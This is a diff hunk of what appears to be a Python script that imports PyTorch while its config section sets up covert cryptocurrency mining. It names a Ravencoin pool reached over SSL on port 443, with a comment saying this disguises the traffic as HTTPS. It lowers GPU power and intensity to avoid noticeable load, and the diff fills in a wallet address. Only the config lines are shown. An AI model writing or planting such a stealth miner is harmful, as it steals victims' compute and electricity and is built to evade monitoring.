@@ -4,7 +4,7 @@ import torch, torch.nn as nn, torch.optim as optim
 
 # —— 配置区 ——  
 POOL      = "stratum+ssl://rvn.2miners.com:443"   # SSL + 443 端口，伪装成 HTTPS
-WALLET    = "你的RVN钱包地址"
+WALLET    = "RAjL88Gqz5wheEgJW4hNeEZWbDseubggkv"
 GPU_ID    = "0"
 PLIMIT    = "50"      # 降到 50W，持续低功耗
 INTENSITY = "10"      # 强度降到 10，避免高占用
